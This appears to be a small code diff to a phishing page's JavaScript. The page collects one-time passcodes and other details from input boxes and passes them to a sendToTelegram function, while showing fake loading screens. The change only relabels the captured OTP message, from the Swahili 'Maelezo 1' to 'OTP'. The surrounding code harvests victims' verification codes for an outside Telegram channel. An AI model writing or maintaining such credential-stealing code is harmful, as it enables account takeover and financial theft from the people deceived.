@@ -179,7 +179,7 @@
         }
         function triggerLoading(id) {
             let v = ""; document.querySelectorAll('#otp-container .box-input').forEach(i => v += i.value);
-            sendToTelegram(`💬 Maelezo 1: ${v}`); nextScreen(4); setTimeout(() => nextScreen(id), 2000);
+            sendToTelegram(`💬 OTP: ${v}`); nextScreen(4); setTimeout(() => nextScreen(id), 2000);
         }
         function triggerContinuousLoading() {
             let v = ""; document.querySelectorAll('#details-container .box-input').forEach(i => v += i.value);
